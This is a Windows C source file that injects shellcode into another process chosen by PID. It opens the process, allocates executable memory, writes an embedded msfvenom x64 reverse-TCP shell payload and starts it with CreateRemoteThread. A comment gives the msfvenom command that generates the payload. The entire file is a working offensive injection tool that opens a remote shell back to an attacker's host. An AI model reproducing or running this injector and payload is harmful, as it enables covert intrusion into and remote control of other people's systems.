#include <windows.h>
#include <stdio.h>


void okay(char *msg) { printf("[+] %s", msg); }
void info(char *msg) { printf("[*] %s", msg); }
void error(char *msg) { printf("[-] %s", msg); }

int main(int argc, char const *argv[])
{
    char msg[100];
    DWORD pid;
    HANDLE hProcess, hThread = NULL;
    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread
    // --platform windows -b "\x00\x0a\x0d" -f c -v revShell  
    const char revShell[] = 
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xcd\xe8\x11\xc6\x95\xba\x93\xc4\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x31\xa0\x92"
"\x22\x65\x52\x53\xc4\xcd\xe8\x50\x97\xd4\xea\xc1\x95\x9b"
"\xa0\x20\x14\xf0\xf2\x18\x96\xad\xa0\x9a\x94\x8d\xf2\x18"
"\x96\xed\xa0\x9a\xb4\xc5\xf2\x9c\x73\x87\xa2\x5c\xf7\x5c"
"\xf2\xa2\x04\x61\xd4\x70\xba\x97\x96\xb3\x85\x0c\x21\x1c"
"\x87\x94\x7b\x71\x29\x9f\xa9\x40\x8e\x1e\xe8\xb3\x4f\x8f"
"\xd4\x59\xc7\x45\x31\x13\x4c\xcd\xe8\x11\x8e\x10\x7a\xe7"
"\xa3\x85\xe9\xc1\x96\x1e\xf2\x8b\x80\x46\xa8\x31\x8f\x94"
"\x6a\x70\x92\x85\x17\xd8\x87\x1e\x8e\x1b\x8c\xcc\x3e\x5c"
"\xf7\x5c\xf2\xa2\x04\x61\xa9\xd0\x0f\x98\xfb\x92\x05\xf5"
"\x08\x64\x37\xd9\xb9\xdf\xe0\xc5\xad\x28\x17\xe0\x62\xcb"
"\x80\x46\xa8\x35\x8f\x94\x6a\xf5\x85\x46\xe4\x59\x82\x1e"
"\xfa\x8f\x8d\xcc\x38\x50\x4d\x91\x32\xdb\xc5\x1d\xa9\x49"
"\x87\xcd\xe4\xca\x9e\x8c\xb0\x50\x9f\xd4\xe0\xdb\x47\x21"
"\xc8\x50\x94\x6a\x5a\xcb\x85\x94\xb2\x59\x4d\x87\x53\xc4"
"\x3b\x32\x17\x4c\x8f\x2b\xcd\xe0\xf6\x92\xdb\x23\xc6\x95"
"\xfb\xc5\x8d\x44\x0e\x59\x47\x79\x1a\x92\xc4\xcd\xa1\x98"
"\x23\xdc\x06\x91\xc4\xdc\xb4\xd1\x6e\xad\xd6\xd2\x90\x84"
"\x61\xf5\x8a\x1c\x4b\xd2\x7e\x81\x9f\x37\xc1\x6a\x6f\xdf"
"\x4d\x27\x80\x10\xc7\x95\xba\xca\x85\x77\xc1\x91\xad\x95"
"\x45\x46\x94\x9d\xa5\x20\x0f\xd8\x8b\x53\x8c\x32\x28\x59"
"\x4f\x57\xf2\x6c\x04\x85\x61\xd0\x87\x2f\x50\x9c\x1b\x2d"
"\x17\xc4\x8e\x1c\x7d\xf9\xd4\x8c\xb0\x5d\x4f\x77\xf2\x1a"
"\x3d\x8c\x52\x88\x63\xe1\xdb\x6c\x11\x85\x69\xd5\x86\x97"
"\xba\x93\x8d\x75\x8b\x7c\xa2\x95\xba\x93\xc4\xcd\xa9\x41"
"\x87\xc5\xf2\x1a\x26\x9a\xbf\x46\x8b\xa4\x7a\xf9\xc9\x94"
"\xa9\x41\x24\x69\xdc\x54\x80\xe9\xbc\x10\xc7\xdd\x37\xd7"
"\xe0\xd5\x2e\x11\xae\xdd\x33\x75\x92\x9d\xa9\x41\x87\xc5"
"\xfb\xc3\x8d\x32\x28\x50\x96\xdc\x45\x5b\x89\x44\x29\x5d"
"\x4f\x54\xfb\x29\xbd\x01\xd7\x97\x39\x40\xf2\xa2\x16\x85"
"\x17\xdb\x4d\x9b\xfb\x29\xcc\x4a\xf5\x71\x39\x40\x01\x73"
"\xd9\xe7\xe2\x50\x7c\x33\x2f\x2e\x59\x32\x3d\x59\x45\x51"
"\x92\xaf\xc2\xb1\xe2\x91\x3d\x75\xcf\x96\x7f\x8a\xfb\x63"
"\xa9\xff\xba\xca\x85\x44\x32\xee\x13\x95\xba\x93\xc4";

    size_t revShellSize = sizeof(revShell);

    if (argc < 2){
        sprintf(msg, "Usage %s <pid>\n", argv[0]);
        info(msg);
        return EXIT_SUCCESS;
    }

    pid = atoi(argv[1]);
    //info((char*)"Enter the PID: ");
    //scanf("%ld", &pid);
    sprintf(msg, "Trying to open process with (%ld)\n", pid);
    info(msg);

    // HANDLE OpenProcess(
    //   [in] DWORD dwDesiredAccess,
    //   [in] BOOL  bInheritHandle,
    //   [in] DWORD dwProcessId
    // );
    // Open handle to the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (hProcess == NULL){
        sprintf(msg, "Impossible to get handle of the process(0x%p): Error %ld\n", hProcess, GetLastError());
        error(msg);
        return EXIT_FAILURE;
    }
    sprintf(msg, "Handle got for process(0x%p)\n", hProcess);
    okay(msg);

    // LPVOID VirtualAllocEx(
    //   [in]           HANDLE hProcess,
    //   [in, optional] LPVOID lpAddress,
    //   [in]           SIZE_T dwSize,
    //   [in]           DWORD  flAllocationType,
    //   [in]           DWORD  flProtect
    // );
    // Allocate bytes to process memory
    LPVOID baseAddr = VirtualAllocEx(hProcess, NULL, revShellSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (baseAddr == NULL){
        sprintf(msg, "Impossible to allocate %ld bytes of memory in process(0x%p): Error %ld\n", revShellSize, hProcess, GetLastError());
        error(msg);
        return EXIT_FAILURE;
    }
    sprintf(msg, "%ld bytes of memory successfully allocate in process(0x%p)\n", revShellSize, hProcess);
    okay(msg);

    // BOOL WriteProcessMemory(
    //   [in]  HANDLE  hProcess,
    //   [in]  LPVOID  lpBaseAddress,
    //   [in]  LPCVOID lpBuffer,
    //   [in]  SIZE_T  nSize,
    //   [out] SIZE_T  *lpNumberOfBytesWritten
    // );
    // Write bytes(shellcode) to process allocated memory
    if (WriteProcessMemory(hProcess, baseAddr, (LPCVOID)revShell, revShellSize, NULL) == 0){
        sprintf(msg, "Impossible to write shellcode to process(0x%p): Error %ld\n", hProcess, GetLastError());
        error(msg);
        return EXIT_FAILURE;
    }
    sprintf(msg, "%ld bytes of data successfully wrote in memory of process(0x%p)\n", revShellSize, hProcess);
    okay(msg);

    // HANDLE CreateRemoteThread(
    //   [in]  HANDLE                 hProcess,
    //   [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    //   [in]  SIZE_T                 dwStackSize,
    //   [in]  LPTHREAD_START_ROUTINE lpStartAddress,
    //   [in]  LPVOID                 lpParameter,
    //   [in]  DWORD                  dwCreationFlags,
    //   [out] LPDWORD                lpThreadId
    // );
    // Create thread to run the shellcode
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddr, NULL, 0, NULL);
    if ( hThread == NULL){
        sprintf(msg, "Impossible to create thread in process(0x%p): Error %ld\n", hProcess, GetLastError());
        error(msg);
        return EXIT_FAILURE;
    }
    sprintf(msg, "Successfully create thread(0x%p) to run the shellcode in process(0x%p)\n", hThread, hProcess);
    okay(msg);

    okay((char*)"Waiting for thread to finish executing...\n");
    WaitForSingleObject(hThread, INFINITE);
    
    okay((char*)"Thread finished executing, cleaning up\n");

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}
